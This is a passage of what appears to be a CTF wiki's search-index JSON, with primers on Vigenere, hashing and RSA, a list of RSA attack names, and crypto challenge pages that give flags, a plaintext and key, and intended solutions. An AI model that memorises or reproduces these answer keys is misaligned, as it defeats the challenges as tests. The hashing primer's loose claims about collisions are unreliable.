            "text": "Vigenere Cipher\n\n\nA Vigenere Cipher is an extended \nCaesar Cipher\n where a message is encrypted using various Caesar shifted alphabets.\n\n\nThe following table can be used to encode a message:\n\n\n\nEncryption\n\n\nFor example, encrypting the text \nSUPERSECRET\n with \nCODE\n would follow this process:\n\n\n\n\nCODE\n gets padded to the length of \nSUPERSECRET\n so the key becomes \nCODECODECOD\n\n\nFor each letter in \nSUPERSECRET\n we use the table to get the Alphabet to use, in this instance row \nC\n and column \nS\n\n\nThe ciphertext's first letter then becomes \nU\n\n\nWe eventually get \nUISITGHGTSW\n\n\n\n\nDecryption\n\n\n\n\nGo to the row of the key, in this case \nC\n \n\n\nFind the letter of the cipher text in this row, in this case \nU\n\n\nThe column is the first letter of the decrypted ciphertext, so we get \nS\n\n\nAfter repeating this process we get back to \nSUPERSECRET", 
            "title": "What is a Vigenere Cipher"
        }, 
        {
            "location": "/cryptography/what-is-a-vigenere-cipher/#vigenere-cipher", 
            "text": "A Vigenere Cipher is an extended  Caesar Cipher  where a message is encrypted using various Caesar shifted alphabets.  The following table can be used to encode a message:", 
            "title": "Vigenere Cipher"
        }, 
        {
            "location": "/cryptography/what-is-a-vigenere-cipher/#encryption", 
            "text": "For example, encrypting the text  SUPERSECRET  with  CODE  would follow this process:   CODE  gets padded to the length of  SUPERSECRET  so the key becomes  CODECODECOD  For each letter in  SUPERSECRET  we use the table to get the Alphabet to use, in this instance row  C  and column  S  The ciphertext's first letter then becomes  U  We eventually get  UISITGHGTSW", 
            "title": "Encryption"
        }, 
        {
            "location": "/cryptography/what-is-a-vigenere-cipher/#decryption", 
            "text": "Go to the row of the key, in this case  C    Find the letter of the cipher text in this row, in this case  U  The column is the first letter of the decrypted ciphertext, so we get  S  After repeating this process we get back to  SUPERSECRET", 
            "title": "Decryption"
        }, 
        {
            "location": "/cryptography/what-are-hashing-functions/", 
            "text": "Hashing Functions\n\n\nHashing functions are one way functions which theoretically provide a unique output for every input. MD5, SHA-1, and other hashes which were considered secure are now found to have \ncollisions\n or two different pieces of data which produce the same supposed unique output.\n\n\nString Hashing\n\n\nA string hash is a number or string generated using an algorithm that runs on text or data.\n\n\nThe idea is that each hash should be unique to the text or data (although sometimes it isn\u2019t). For example, the hash for \u201cdog\u201d should be different from other hashes.\n\n\nYou can use command line tools tools or online resources such as this one.\nExample:\n\n$ \necho\n -n password \n|\n md5  5f4dcc3b5aa765d61d8327deb882cf99\n\nHere, \u201cpassword\u201d is hashed with different hashing algorithms:\n\n\n\n\nSHA-1\n: 5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8\n\n\nSHA-2\n: 5E884898DA28047151D0E56F8DC6292773603D0D6AABBDD62A11EF721D1542D8\n\n\nMD5\n: 5F4DCC3B5AA765D61D8327DEB882CF99\n\n\nCRC32\n: BBEDA74F\n\n\n\n\nGenerally, when verifying a hash visually, you can simply look at the first and last four characters of the string.\n\n\nFile Hashing\n\n\nA file hash is a number or string generated using an algorithm that is run on text or data. The premise is that it should be unique to the text or data. If the file or text changes in any way, the hash will change.\n\n\nWhat is it used for?\n- File and data identification\n- Password/certificate storage comparison\n\n\nHow can we determine the hash of a file? You can use the md5sum command (or similar).\n\n\n$ md5sum samplefile.txt\n3b85ec9ab2984b91070128be6aae25eb samplefile.txt\n\n\n\n\n\nHash Collisions\n\n\nA collision is when two pieces of data or text have the same cryptographic hash. This is very rare.\n\n\nWhat\u2019s significant about collisions is that they can be used to crack password hashes. Passwords are usually stored as hashes on a computer, since it\u2019s hard to get the passwords from hashes.\n\n\n\n\nIf you bruteforce by trying every possible piece of text or data, eventually you\u2019ll find something with the same hash. Enter it, and the computer accepts it as if you entered the actual password.\n\n\nTwo different files on the same hard drive with the same cryptographic hash can be very interesting.\n\n\n\u201cIt\u2019s now well-known that the cryptographic hash function MD5 has been broken,\u201d \nsaid Peter Selinger of Dalhousie University\n. \u201cIn March 2005, Xiaoyun Wang and Hongbo Yu of Shandong University in China published an article in which they described an algorithm that can find two different sequences of 128 bytes with the same MD5 hash.\u201d\n\n\nFor example, he cited this famous pair:\n\n\n\n\nand\n\n\n\n\nEach of these blocks has MD5 hash 79054025255fb1a26e4bc422aef54eb4.\n\n\nSelinger said that \u201cthe algorithm of Wang and Yu can be used to create files of arbitrary length that have identical MD5 hashes, and that differ only in 128 bytes somewhere in the middle of the file. Several people have used this technique to create pairs of interesting files with identical MD5 hashes.\u201d\n\n\nBen Laurie \nhas a nice website that visualizes this MD5 collision\n. For a non-technical, though slightly outdated, introduction to hash functions, see \nSteve Friedl\u2019s Illustrated Guide\n. And \nhere\u2019s a good article\n from DFI News that explores the same topic.", 
            "title": "What are Hashing Functions"
        }, 
        {
            "location": "/cryptography/what-are-hashing-functions/#hashing-functions", 
            "text": "Hashing functions are one way functions which theoretically provide a unique output for every input. MD5, SHA-1, and other hashes which were considered secure are now found to have  collisions  or two different pieces of data which produce the same supposed unique output.", 
            "title": "Hashing Functions"
        }, 
        {
            "location": "/cryptography/what-are-hashing-functions/#string-hashing", 
            "text": "A string hash is a number or string generated using an algorithm that runs on text or data.  The idea is that each hash should be unique to the text or data (although sometimes it isn\u2019t). For example, the hash for \u201cdog\u201d should be different from other hashes.  You can use command line tools tools or online resources such as this one.\nExample: $  echo  -n password  |  md5  5f4dcc3b5aa765d61d8327deb882cf99 \nHere, \u201cpassword\u201d is hashed with different hashing algorithms:   SHA-1 : 5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8  SHA-2 : 5E884898DA28047151D0E56F8DC6292773603D0D6AABBDD62A11EF721D1542D8  MD5 : 5F4DCC3B5AA765D61D8327DEB882CF99  CRC32 : BBEDA74F   Generally, when verifying a hash visually, you can simply look at the first and last four characters of the string.", 
            "title": "String Hashing"
        }, 
        {
            "location": "/cryptography/what-are-hashing-functions/#file-hashing", 
            "text": "A file hash is a number or string generated using an algorithm that is run on text or data. The premise is that it should be unique to the text or data. If the file or text changes in any way, the hash will change.  What is it used for?\n- File and data identification\n- Password/certificate storage comparison  How can we determine the hash of a file? You can use the md5sum command (or similar).  $ md5sum samplefile.txt\n3b85ec9ab2984b91070128be6aae25eb samplefile.txt", 
            "title": "File Hashing"
        }, 
        {
            "location": "/cryptography/what-are-hashing-functions/#hash-collisions", 
            "text": "A collision is when two pieces of data or text have the same cryptographic hash. This is very rare.  What\u2019s significant about collisions is that they can be used to crack password hashes. Passwords are usually stored as hashes on a computer, since it\u2019s hard to get the passwords from hashes.   If you bruteforce by trying every possible piece of text or data, eventually you\u2019ll find something with the same hash. Enter it, and the computer accepts it as if you entered the actual password.  Two different files on the same hard drive with the same cryptographic hash can be very interesting.  \u201cIt\u2019s now well-known that the cryptographic hash function MD5 has been broken,\u201d  said Peter Selinger of Dalhousie University . \u201cIn March 2005, Xiaoyun Wang and Hongbo Yu of Shandong University in China published an article in which they described an algorithm that can find two different sequences of 128 bytes with the same MD5 hash.\u201d  For example, he cited this famous pair:   and   Each of these blocks has MD5 hash 79054025255fb1a26e4bc422aef54eb4.  Selinger said that \u201cthe algorithm of Wang and Yu can be used to create files of arbitrary length that have identical MD5 hashes, and that differ only in 128 bytes somewhere in the middle of the file. Several people have used this technique to create pairs of interesting files with identical MD5 hashes.\u201d  Ben Laurie  has a nice website that visualizes this MD5 collision . For a non-technical, though slightly outdated, introduction to hash functions, see  Steve Friedl\u2019s Illustrated Guide . And  here\u2019s a good article  from DFI News that explores the same topic.", 
            "title": "Hash Collisions"
        }, 
        {
            "location": "/cryptography/what-are-block-modes-of-operation/", 
            "text": "Block Modes of Operation", 
            "title": "What are Block Modes of Operation"
        }, 
        {
            "location": "/cryptography/what-are-block-modes-of-operation/#block-modes-of-operation", 
            "text": "", 
            "title": "Block Modes of Operation"
        }, 
        {
            "location": "/cryptography/what-is-rsa/", 
            "text": "RSA\n\n\nRSA, which is an abbreviation of the author's names (Rivest\u2013Shamir\u2013Adleman), is a cryptosystem which allows for asymmetric encryption. Asymmetric cryptosystems are alos commonly referred to as \nPublic Key Cryptography\n where a public key is used to encrypt data and only a secret, private key can be used to decrypt the data.\n\n\nDefinitions\n\n\n\n\nThe \nPublic Key\n is made up of (\nn\n, \ne\n)\n\n\nThe \nPrivate Key\n is made up of (\nn\n, \nd\n)\n\n\nThe message is represented as \nm\n and is converted into a number\n\n\nThe encrypted message or ciphertext is represented by \nc\n\n\np\n and \nq\n are prime numbers which make up \nn\n\n\ne\n is the public exponent\n\n\nn\n is the modulus and its length in bits is the bit length (i.e. 1024 bit RSA)\n\n\nd\n is the private exponent\n\n\nThe totient \u03bb(\nn\n) is used to compute \nd\n and is equal to the lcm(\np\n-1, \nq\n-1)\n\n\n\n\nWhat makes RSA viable?\n\n\nIf public \nn\n, public \ne\n, private \nd\n are all very large numbers and a message \nm\n holds true for 0 \n \nm\n \n \nn\n, then we can say:\n\n\n\n\n(\nm\ne\n)\nd\n \u2261 \nm\n (mod \nn\n)\n\n\n\n\n\n\nNote\n\n\nThe triple equals sign in this case refers to \nmodular congruence\n which in this case means that there exists an integer \nk\n such that (\nm\ne\n)\nd\n = \nkn\n + \nm\n\n\n\n\nRSA is viable because it is incredibly hard to find \nd\n even with \nm\n, \nn\n, and \ne\n because factoring large numbers is an arduous process.\n\n\nImplementation\n\n\nRSA follows 4 steps to be implemented:\n1. Key Generation\n2. Encryption\n3. Decryption\n\n\nKey Generation\n\n\nWe are going to follow along Wikipedia's small numbers example in order to make this idea a bit easier to understand.\n\n\n\n\nChoose two prime numbers such as: \n\n\np\n = 61 and \nq\n = 53\n\n\n\n\n\n\nFind \nn\n: \n\n\nn\n = \npq\n = 3233\n\n\n\n\n\n\nCalculate \u03bb(\nn\n) = lcm(\np\n-1, \nq\n-1) \n\n\n\u03bb(3233) = lcm(60, 52) = 780\n\n\n\n\n\n\nChoose a public exponent such that 1 \n \ne\n \n \u03bb(\nn\n) and is coprime (not a factor of) \u03bb(\nn\n). The standard is most cases is 65537, but we will be using: \n\n\ne\n = 17\n\n\n\n\n\n\nCalculate \nd\n as the modular multiplicative inverse or in english find \nd\n such that: \nd\n x \ne\n mod \u03bb(\nn\n) = 1\n\n\nd\n x 17 mod 780 = 1\n\n\nd\n = 413\n\n\n\n\n\n\n\n\nNow we have a public key of (3233, 17) and a private key of (3233, 413)\n\n\nEncryption\n\n\nWith the public key, \nm\n can be encrypted trivially\n\n\nThe ciphertext is equal to \nm\ne\n mod \nn\n or:\n\n\nc\n = \nm\n17\n mod 3233\n\n\nDecryption\n\n\nWith the private key, \nm\n can be decrypted trivially as well\n\n\nThe plaintext is equal to \nc\nd\n mod \nn\n or:\n\n\nm\n = \nc\n413\n mod 3233\n\n\nExploitation\n\n\nFrom the \nRsaCtfTool README\n\n\n\n\nAttacks:\n\n\n\n\nWeak public key factorization\n\n\nWiener's attack\n\n\nHastad's attack (Small public exponent attack)\n\n\nSmall q (q \n 100,000)\n\n\nCommon factor between ciphertext and modulus attack\n\n\nFermat's factorisation for close p and q\n\n\nGimmicky Primes method\n\n\nPast CTF Primes method\n\n\nSelf-Initializing Quadratic Sieve (SIQS) using Yafu\n\n\nCommon factor attacks across multiple keys\n\n\nSmall fractions method when p/q is close to a small fraction\n\n\nBoneh Durfee Method when the private exponent d is too small compared to the modulus (i.e d \n n\n0.292\n)\n\n\nElliptic Curve Method\n\n\nPollards p-1 for relatively smooth numbers\n\n\nMersenne primes factorization", 
            "title": "What is RSA"
        }, 
        {
            "location": "/cryptography/what-is-rsa/#rsa", 
            "text": "RSA, which is an abbreviation of the author's names (Rivest\u2013Shamir\u2013Adleman), is a cryptosystem which allows for asymmetric encryption. Asymmetric cryptosystems are alos commonly referred to as  Public Key Cryptography  where a public key is used to encrypt data and only a secret, private key can be used to decrypt the data.", 
            "title": "RSA"
        }, 
        {
            "location": "/cryptography/what-is-rsa/#definitions", 
            "text": "The  Public Key  is made up of ( n ,  e )  The  Private Key  is made up of ( n ,  d )  The message is represented as  m  and is converted into a number  The encrypted message or ciphertext is represented by  c  p  and  q  are prime numbers which make up  n  e  is the public exponent  n  is the modulus and its length in bits is the bit length (i.e. 1024 bit RSA)  d  is the private exponent  The totient \u03bb( n ) is used to compute  d  and is equal to the lcm( p -1,  q -1)", 
            "title": "Definitions"
        }, 
        {
            "location": "/cryptography/what-is-rsa/#what-makes-rsa-viable", 
            "text": "If public  n , public  e , private  d  are all very large numbers and a message  m  holds true for 0    m     n , then we can say:   ( m e ) d  \u2261  m  (mod  n )    Note  The triple equals sign in this case refers to  modular congruence  which in this case means that there exists an integer  k  such that ( m e ) d  =  kn  +  m   RSA is viable because it is incredibly hard to find  d  even with  m ,  n , and  e  because factoring large numbers is an arduous process.", 
            "title": "What makes RSA viable?"
        }, 
        {
            "location": "/cryptography/what-is-rsa/#implementation", 
            "text": "RSA follows 4 steps to be implemented:\n1. Key Generation\n2. Encryption\n3. Decryption", 
            "title": "Implementation"
        }, 
        {
            "location": "/cryptography/what-is-rsa/#key-generation", 
            "text": "We are going to follow along Wikipedia's small numbers example in order to make this idea a bit easier to understand.   Choose two prime numbers such as:   p  = 61 and  q  = 53    Find  n :   n  =  pq  = 3233    Calculate \u03bb( n ) = lcm( p -1,  q -1)   \u03bb(3233) = lcm(60, 52) = 780    Choose a public exponent such that 1    e    \u03bb( n ) and is coprime (not a factor of) \u03bb( n ). The standard is most cases is 65537, but we will be using:   e  = 17    Calculate  d  as the modular multiplicative inverse or in english find  d  such that:  d  x  e  mod \u03bb( n ) = 1  d  x 17 mod 780 = 1  d  = 413     Now we have a public key of (3233, 17) and a private key of (3233, 413)", 
            "title": "Key Generation"
        }, 
        {
            "location": "/cryptography/what-is-rsa/#encryption", 
            "text": "With the public key,  m  can be encrypted trivially  The ciphertext is equal to  m e  mod  n  or:  c  =  m 17  mod 3233", 
            "title": "Encryption"
        }, 
        {
            "location": "/cryptography/what-is-rsa/#decryption", 
            "text": "With the private key,  m  can be decrypted trivially as well  The plaintext is equal to  c d  mod  n  or:  m  =  c 413  mod 3233", 
            "title": "Decryption"
        }, 
        {
            "location": "/cryptography/what-is-rsa/#exploitation", 
            "text": "From the  RsaCtfTool README   Attacks:   Weak public key factorization  Wiener's attack  Hastad's attack (Small public exponent attack)  Small q (q   100,000)  Common factor between ciphertext and modulus attack  Fermat's factorisation for close p and q  Gimmicky Primes method  Past CTF Primes method  Self-Initializing Quadratic Sieve (SIQS) using Yafu  Common factor attacks across multiple keys  Small fractions method when p/q is close to a small fraction  Boneh Durfee Method when the private exponent d is too small compared to the modulus (i.e d   n 0.292 )  Elliptic Curve Method  Pollards p-1 for relatively smooth numbers  Mersenne primes factorization", 
            "title": "Exploitation"
        }, 
        {
            "location": "/challenges/2017/crypto/ecxor/", 
            "text": "ecxor\n\n\nAuthor\n\n\naweinstock\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nI used some super-powerful crypto tonight\nI hear that elliptic curves make it safe to use smaller key sizes. Can you break this curve25519-encrypted message?\n\n\nFlag\n\n\nflag{generalizing_vignere_to_arbitrary_groups_is_not_good}\n\n\nSolution\n\n\necxor_solver.py\n\n\nSetup\n\n\nChallenge files: (exactly one of ecxor_handout_{100,200,300}.py), rfc8032.py, and a \nciphertext blob generated with the the handout and the real flag. DO NOT give oracle access to a server (the handouts aren't side-channel hardened).\nIntended solution: do (blob - 'flag{') to get a partial key, and crib/use ngram-style heuristics to use the english blob at the end to infer the rest of the key\n\n\nNotes\n\n\nChallenge points: {100,200,300} depending on whether ecxor_handout_{100,200,300}.py is given out. These are not independent challenges: ecxor_handout_100.py basically has extra hints towards the solution.", 
            "title": "ECXOR"
        }, 
        {
            "location": "/challenges/2017/crypto/ecxor/#ecxor", 
            "text": "", 
            "title": "ecxor"
        }, 
        {
            "location": "/challenges/2017/crypto/ecxor/#author", 
            "text": "aweinstock", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/crypto/ecxor/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/crypto/ecxor/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/crypto/ecxor/#description", 
            "text": "I used some super-powerful crypto tonight\nI hear that elliptic curves make it safe to use smaller key sizes. Can you break this curve25519-encrypted message?", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/crypto/ecxor/#flag", 
            "text": "flag{generalizing_vignere_to_arbitrary_groups_is_not_good}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/crypto/ecxor/#solution", 
            "text": "ecxor_solver.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/crypto/ecxor/#setup", 
            "text": "Challenge files: (exactly one of ecxor_handout_{100,200,300}.py), rfc8032.py, and a \nciphertext blob generated with the the handout and the real flag. DO NOT give oracle access to a server (the handouts aren't side-channel hardened).\nIntended solution: do (blob - 'flag{') to get a partial key, and crib/use ngram-style heuristics to use the english blob at the end to infer the rest of the key", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/crypto/ecxor/#notes", 
            "text": "Challenge points: {100,200,300} depending on whether ecxor_handout_{100,200,300}.py is given out. These are not independent challenges: ecxor_handout_100.py basically has extra hints towards the solution.", 
            "title": "Notes"
        }, 
        {
            "location": "/challenges/2017/crypto/another_xor/", 
            "text": "Anothor_Xor\n\n\nAuthor\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nReceiving a python script that encrypts a string using a user-chosen key, and an encrypted message- try to get the flag.\n\n\nHey, hey can you find my secret.\n\n\n274c10121a0100495b502d551c557f0b0833585d1b27030b5228040d3753490a1c025415051525455118001911534a0052560a14594f0b1e490a010c4514411e070014615a181b02521b580305170002074b0a1a4c414d1f1d171d00151b1d0f480e491e0249010c150050115c505850434203421354424c1150430b5e094d144957080d4444254643\n\n\nFlag\n\n\nflag{sti11_us3_da_x0r_for_my_s3cratz}\n\n\nSolution\n\n\nplaintext:\nflag                                  key                                                                hash(flag+key)\nflag{sti11_us3_da_x0r_for_my_s3cratz}|A quart jar of oil mixed with zinc oxide makes a very bright paint|d5111350bbbe105121b9a9496ac08df2\n\n\nThe key is repeated to be able to encrypt the plaintext.\n\n\nSetup\n\n\nChallengers will be given the cipher:\n\n\n274c10121a0100495b502d551c557f0b0833585d1b27030b5228040d3753490a1c025415051525455118001911534a0052560a14594f0b1e490a010c4514411e070014615a181b02521b580305170002074b0a1a4c414d1f1d171d00151b1d0f480e491e0249010c150050115c505850434203421354424c1150430b5e094d144957080d4444254643", 
            "title": "Another XOR"
        }, 
        {
            "location": "/challenges/2017/crypto/another_xor/#anothor_xor", 
            "text": "", 
            "title": "Anothor_Xor"
        }, 
        {
            "location": "/challenges/2017/crypto/another_xor/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/crypto/another_xor/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/crypto/another_xor/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/crypto/another_xor/#description", 
            "text": "Receiving a python script that encrypts a string using a user-chosen key, and an encrypted message- try to get the flag.  Hey, hey can you find my secret.  274c10121a0100495b502d551c557f0b0833585d1b27030b5228040d3753490a1c025415051525455118001911534a0052560a14594f0b1e490a010c4514411e070014615a181b02521b580305170002074b0a1a4c414d1f1d171d00151b1d0f480e491e0249010c150050115c505850434203421354424c1150430b5e094d144957080d4444254643", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/crypto/another_xor/#flag", 
            "text": "flag{sti11_us3_da_x0r_for_my_s3cratz}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/crypto/another_xor/#solution", 
            "text": "plaintext:\nflag                                  key                                                                hash(flag+key)\nflag{sti11_us3_da_x0r_for_my_s3cratz}|A quart jar of oil mixed with zinc oxide makes a very bright paint|d5111350bbbe105121b9a9496ac08df2  The key is repeated to be able to encrypt the plaintext.", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/crypto/another_xor/#setup", 
            "text": "Challengers will be given the cipher:  274c10121a0100495b502d551c557f0b0833585d1b27030b5228040d3753490a1c025415051525455118001911534a0052560a14594f0b1e490a010c4514411e070014615a181b02521b580305170002074b0a1a4c414d1f1d171d00151b1d0f480e491e0249010c150050115c505850434203421354424c1150430b5e094d144957080d4444254643", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2016/crypto/Sleeping_Guard/", 
            "text": "Sleeping Guard\n\n\nAuthor\n\n\nSophia D'Antoine\n\n\nPoints\n\n\n50 \n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nOnly true hackers can see the image in this magic PNG.... \n\n\nFlag\n\n\n(flag printed in the decrypted magic.png file)\n\nflag{l4zy_H4CK3rs_d0nt_g3T_MAg1C_FlaG5}\n\n\nSolution\n\n\nsolution.py\n\n\nsolution.png\n\n\nPremise\n\n\nThis challenge is a server which sends you a base64 encoded PNG image. The hint is given in the title to solve this. First that the encoding mechanism is a Xor and the way to decrypt is use the fact that all PNG's have the same first 12 byte headers. \n\n\nSetup\n\n\nDistribute sleeping_49d06c703032f66151ae07066d509c61.py  (md5sum appended)\nDistrubute the server code after REMOVING the encryption key used in the Xor.\nServer side run the server with the correct key in it.\nPossible hints are look at the title for clues. All files have same magic header.", 
            "title": "Sleeping Guard"
        }, 
        {
            "location": "/challenges/2016/crypto/Sleeping_Guard/#sleeping-guard", 
            "text": "", 
            "title": "Sleeping Guard"
        }, 
        {
            "location": "/challenges/2016/crypto/Sleeping_Guard/#author", 
            "text": "Sophia D'Antoine", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/crypto/Sleeping_Guard/#points", 
            "text": "50", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/crypto/Sleeping_Guard/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/crypto/Sleeping_Guard/#description", 
            "text": "Only true hackers can see the image in this magic PNG....", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/crypto/Sleeping_Guard/#flag", 
            "text": "(flag printed in the decrypted magic.png file) flag{l4zy_H4CK3rs_d0nt_g3T_MAg1C_FlaG5}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/crypto/Sleeping_Guard/#solution", 
            "text": "solution.py  solution.png", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/crypto/Sleeping_Guard/#premise", 
            "text": "This challenge is a server which sends you a base64 encoded PNG image. The hint is given in the title to solve this. First that the encoding mechanism is a Xor and the way to decrypt is use the fact that all PNG's have the same first 12 byte headers.", 
            "title": "Premise"
        }, 
        {
            "location": "/challenges/2016/crypto/Sleeping_Guard/#setup", 
            "text": "Distribute sleeping_49d06c703032f66151ae07066d509c61.py  (md5sum appended)\nDistrubute the server code after REMOVING the encryption key used in the Xor.\nServer side run the server with the correct key in it.\nPossible hints are look at the title for clues. All files have same magic header.", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2016/crypto/katy/", 
            "text": "Katy\n\n\nAuthor\n\n\nPoints\n\n\n50\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nhi every1 im new!!!!!!! holds up spork my name is katy but u can call me t3h PeNgU1N oF d00m!!!!!!!! lol\u2026as u can see im very random!!!! thats why i came here, 2 meet random ppl like me \u2026_\u2026 im 13 years old (im mature 4 my age tho!!) i like 2 watch invader zim w/ my girlfreind (im bi if u dont like it deal w/it) its our favorite tv show!!! bcuz its SOOOO random!!!! shes random 2 of course but i want 2 meet more random ppl =) like they say the more the merrier!!!! lol\u2026neways i hope 2 make alot of freinds here so give me lots of commentses!!!!\nDOOOOOMMMM!!!!!!!!!!!!!!!! \n--- me bein random again \n_\n hehe\u2026toodles!!!!!\nlove and waffles,\nt3h PeNgU1N oF d00m\nUpdate: The flag is integer value of the seed\n\n\nFlag\n\n\nflag{praise_rnjesus}\n\n\nSolution", 
            "title": "Katy"
        }, 
        {
            "location": "/challenges/2016/crypto/katy/#katy", 
            "text": "", 
            "title": "Katy"
        }, 
        {
            "location": "/challenges/2016/crypto/katy/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/crypto/katy/#points", 
            "text": "50", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/crypto/katy/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/crypto/katy/#description", 
            "text": "hi every1 im new!!!!!!! holds up spork my name is katy but u can call me t3h PeNgU1N oF d00m!!!!!!!! lol\u2026as u can see im very random!!!! thats why i came here, 2 meet random ppl like me \u2026_\u2026 im 13 years old (im mature 4 my age tho!!) i like 2 watch invader zim w/ my girlfreind (im bi if u dont like it deal w/it) its our favorite tv show!!! bcuz its SOOOO random!!!! shes random 2 of course but i want 2 meet more random ppl =) like they say the more the merrier!!!! lol\u2026neways i hope 2 make alot of freinds here so give me lots of commentses!!!!\nDOOOOOMMMM!!!!!!!!!!!!!!!!  --- me bein random again  _  hehe\u2026toodles!!!!!\nlove and waffles,\nt3h PeNgU1N oF d00m\nUpdate: The flag is integer value of the seed", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/crypto/katy/#flag", 
            "text": "flag{praise_rnjesus}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/crypto/katy/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/crypto/notesy/", 
            "text": "Notesy\n\n\nAuthor\n\n\nChung\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nFlag\n\n\nUNHMAQWZIDYPRCJKBGVSLOETXF\n\n\nSolution\n\n\nSetup", 
            "title": "Notesy"
        }, 
        {
            "location": "/challenges/2015/crypto/notesy/#notesy", 
            "text": "", 
            "title": "Notesy"
        }, 
        {
            "location": "/challenges/2015/crypto/notesy/#author", 
            "text": "Chung", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/crypto/notesy/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/crypto/notesy/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/crypto/notesy/#description", 
            "text": "", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/crypto/notesy/#flag", 
            "text": "UNHMAQWZIDYPRCJKBGVSLOETXF", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/crypto/notesy/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/crypto/notesy/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/crypto/eps/", 
            "text": "EPS (1-3)\n\n\n\n\nones_and_zer0es\n\n\nwh1ter0se\n\n\nzer0_day\n\n\n\n\nAuthor\n\n\nChung\n\n\nPoints\n\n\n50 (each)\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\n\n\n\n\nNote: The flag is the entire thing decrypted\n\n\n\n\n\n\nFlag\n\n\n\n\nflag{People always make the best exploits.}\n\n\nBUT NO, IT WAS A SHORT CUT TO SOMETHING BIGGER. SOMETHING GRANDER. SOMETHING BEAUTIFUL. WE\nVE BEEN FOCUSED ON WHAT\nS IN FRONT OF US. BUT WE HAVEN\nT BEEN LOOKING AT WHAT\nS ABOVE US.\n\n\nflag{We are fsociety, we are finally free, we are finally awake!}\n\n\n\n\nSolution\n\n\nSetup\n\n\nDistribute\n1. eps1.1_ones-and-zer0es_c4368e65e1883044f3917485ec928173.mpeg\n2. eps1.7_wh1ter0se_2b007cf0ba9881d954e85eb475d0d5e4.m4v\n3. eps1.9_zer0-day_b7604a922c8feef666a957933751a074.avi", 
            "title": "EPS"
        }, 
        {
            "location": "/challenges/2015/crypto/eps/#eps-1-3", 
            "text": "ones_and_zer0es  wh1ter0se  zer0_day", 
            "title": "EPS (1-3)"
        }, 
        {
            "location": "/challenges/2015/crypto/eps/#author", 
            "text": "Chung", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/crypto/eps/#points", 
            "text": "50 (each)", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/crypto/eps/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/crypto/eps/#description", 
            "text": "Note: The flag is the entire thing decrypted", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/crypto/eps/#flag", 
            "text": "flag{People always make the best exploits.}  BUT NO, IT WAS A SHORT CUT TO SOMETHING BIGGER. SOMETHING GRANDER. SOMETHING BEAUTIFUL. WE VE BEEN FOCUSED ON WHAT S IN FRONT OF US. BUT WE HAVEN T BEEN LOOKING AT WHAT S ABOVE US.  flag{We are fsociety, we are finally free, we are finally awake!}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/crypto/eps/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/crypto/eps/#setup", 
            "text": "Distribute\n1. eps1.1_ones-and-zer0es_c4368e65e1883044f3917485ec928173.mpeg\n2. eps1.7_wh1ter0se_2b007cf0ba9881d954e85eb475d0d5e4.m4v\n3. eps1.9_zer0-day_b7604a922c8feef666a957933751a074.avi", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/crypto/punchout/", 
